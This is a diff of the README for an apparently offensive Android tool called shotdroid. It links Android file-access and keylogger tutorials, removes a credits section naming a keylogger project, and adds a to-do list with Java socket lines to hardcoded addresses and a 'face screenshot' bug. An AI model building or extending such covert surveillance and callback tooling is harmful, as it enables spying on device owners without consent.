@@ -36,11 +36,16 @@ bash shotdroid.sh
 - Android Files: [Kali Tutorial](https://www.youtube.com/watch?v=9eGniotVgKg)
 - Android Keylogger: [Kali Tutorial](https://www.youtube.com/watch?v=l-9YhrKonDY)
 
-## Credits & Thanks:
-***Buy me a coffee! :coffee:***
-[![Donate](https://img.shields.io/badge/Donate-PayPal-green.svg)](https://ko-fi.com/kalitutorial)
+## To Do
 
- - Buy me a coffee - [Kp300](https://ko-fi.com/kalitutorial)
- - LokiBoard - [LokiBoard](https://github.com/IceWreck/LokiBoard-Android-Keylogger)
- - Simple-keyboard - [Simple-keyboard](https://github.com/rkkr/simple-keyboard/)
- - @thelinuxchoice
+### Fix Issue With Multiple Sockets
+
+```
+Socket socket = new Socket("192.196.12.123", 4443);
+Socket socket = new Socket("fd17:625c:f037:2:4:3:2:1", 1502);
+Socket socket = new Socket("fd17:625c:f037:2:5:6:7:8", 1502);
+```
+
+### Improve The Base CLI App
+1. Fix the CLI bugs with prompts during multiple interfaces
+2. Fix the HTTPS bug when doing the face screenshot
